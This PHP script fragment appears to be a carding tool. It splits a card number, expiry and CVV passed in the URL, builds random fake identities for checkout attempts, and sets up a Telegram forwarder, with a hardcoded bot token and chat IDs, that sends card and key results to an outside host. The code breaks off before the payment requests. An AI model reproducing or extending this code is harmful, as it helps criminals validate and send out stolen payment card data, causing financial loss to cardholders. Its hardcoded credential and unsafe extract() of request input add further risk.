<?php
error_reporting(0);
set_time_limit(0);
ini_set('display_errors', 0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

#if (file_exists('cookie.txt')) {unlink('cookie.txt');}

#unset($ch);
#unlink($oreo);

extract($_GET);

$explode = explode("|", $card);
$cc = $explode[0];
$mm = $explode[1];
#yy = substr($explode[2], 2);
$yyyy = $explode[2];
$year = strlen($yyyy);
if ($year=='2'){
    $yyyy = '20'.$yyyy;
}
$yy = substr($yyyy, 2);
$cvv = $explode[3];
$bin = substr($cc, 0, 6);
$email = gen_str(10).'@gmail.com';
$passwd = gen_str(12);
$fname = gen_str(5);
$lname = gen_str(8);
$phone = str_shuffle('0987654321');
$last4 = substr($cc, 12);

function gen_str($length) {
    return substr(str_shuffle('abcdefghijklmnopqrstuvwzyz'), 0, $length);
}
function get_str($string, $start, $end) {
  return explode($end, explode($start, $string)[1])[0];
}
function gen_id() {
    return strtolower(sprintf('%04X%04X-%04X-%04X-%04X-%04X%04X%04X', mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(16384, 20479), mt_rand(32768, 49151), mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(0, 65535)));
}

# FORWARDER #

# bot token
$botToken = "8155763109:AAGXN85wvNzmivSikOipePNaAezFENTmLXM";
$website = "https://api.telegram.org/bot".$botToken;

$core = file_get_contents('php://input');
$json = json_decode($core, TRUE);
$chatId = $json["message"]["chat"]["id"];
$message_id = $json["message"]["message_id"];

# Replace Chat Id For CC
$chatId = '7125341830';
# Replace Chat Id For SK
$chatIds = '7125341830';

function sendMessage ($chatId, $message) {  
$url = $GLOBALS['website']."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);
}